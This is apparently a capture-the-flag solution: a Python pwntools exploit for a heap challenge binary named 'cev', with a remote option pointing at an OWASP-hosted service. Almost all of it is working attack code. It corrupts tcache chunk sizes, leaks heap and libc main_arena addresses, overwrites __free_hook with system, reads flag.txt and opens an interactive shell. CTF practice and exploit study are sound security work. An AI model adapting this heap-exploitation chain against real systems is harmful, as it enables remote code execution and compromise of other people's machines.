#!/usr/bin/env python3

from pwn import *

def StrToQWord(s):
    out = 0
    i = 0
    for char in s:
        out |= (ord(char) << (8*i))
        i+= 1
    return out

def SizePInUse(size):
    return (size << 3) | 1

def DropShell(conn, system):
    payload = [StrToQWord("/bin/sh")] * 4 + [system]
    n = len(payload)
    q = 0
    conn.sendline(bytes(str(n), 'ascii'))
    conn.sendline(bytes(str(q), 'ascii'))
    for i in range(n):
        conn.sendline(bytes(str(payload[i]), 'ascii'))

def AllocVector(conn, contents, corruptSize=-1):
    n = len(contents)
    q = 1
    if corruptSize != -1:
        q += 1
    conn.sendline(bytes(str(n), 'ascii'))
    conn.sendline(bytes(str(q), 'ascii'))
    for i in range(n):
        conn.sendline(bytes(str(contents[i]), 'ascii'))
    conn.sendline(b"0")
    conn.sendline(bytes(str(len(contents)+1), 'ascii'))
    rval = int(conn.recvline())
    if corruptSize != -1:
        conn.sendline(b"1")
        conn.sendline(b"0")
        conn.sendline(bytes(str(corruptSize), 'ascii'))
    return rval


mode = "local" # or remote

if mode == "local":
    r = process('./cev')
elif mode == "remote":
    r = remote('santapwn.owasp.si', 7478)

### some large `t`, in the end we will control RIP anyways

r.sendline(b"2000000")

### fill tcache so that every bin has at least 2 elements
AllocVector(r, [0xDEADBEEF]*3, SizePInUse(4))
AllocVector(r, [0xDEADBEEF]*5, SizePInUse(6))
AllocVector(r, [0xDEADBEEF]*9, SizePInUse(10))
AllocVector(r, [0xDEADBEEF]*17, SizePInUse(18))
AllocVector(r, [0xDEADBEEF]*33, SizePInUse(34))
AllocVector(r, [0xDEADBEEF]*65, SizePInUse(66))
AllocVector(r, [0xDEADBEEF]*129, SizePInUse(130))

### add an additional large chunks. This will be placed in an unsorted bin and threrefore contain a pointer
### to main_arena+96

AllocVector(r, [0xF00DBABE]*260)

### select chunk from 0x90 tcachebin and enlargen it (to size 0x410)
### Given our setup this chunk is in the heap right before
### both 0x110 chunks. Therefore the larger size allows us to manipulate those.

AllocVector(r, [0xDEADC0DE]*9, SizePInUse(130))

### First we read the pointer from one chunk in the 0x110 tcachebin

heapLeak = AllocVector(r, [0xA] * 67 + [0x111])
log.info("Heap Leak: " + hex(heapLeak))

### Offset between the address read and the address of the 
### chunk containting &main_arena+96
### This can be calculated as the size of the chunks created between them i.e. 8*(34+2*66+2*130+258)

heapoffset = 8 * 684 

### Write the address to the chunk inside the  0x110 tcachebin.

AllocVector(r, [0x0] * 67 + [0x111] + [heapLeak + heapoffset - 16*8], SizePInUse(18))

### Clear first vector in 0x110 bin

AllocVector(r, [SizePInUse(130)] * 17, SizePInUse(130))

### Read &main_arena+96

arenaLeak = AllocVector(r, [SizePInUse(130)] * 15 + [0x9541] + [0x0], SizePInUse(34))

log.info("main_arena+96: " + hex(arenaLeak))

### Do the same thing again this time with chunks from 0x30 bin overflowing into chunks from 0x50 bin

AllocVector(r, [0xDEAD] * 3, SizePInUse(34))

### Address of __freehook for the exploit

AllocVector(r, [0xF00D] * 19 + [0x51] + [arenaLeak + 0x3290-8*4], SizePInUse(6))
AllocVector(r, [0xC0DE] * 5, SizePInUse(130))

### Leak the flag and spawn a shell using the leaked system address and our __freehook exploit

DropShell(r, arenaLeak - 0x175D90)
r.sendline(b"cat flag.txt")
flag = r.recvline(timeout=1).decode("ascii").strip()
log.info("Your flag is \"" + flag + "\" - Spawning shell, have fun!")
r.interactive()
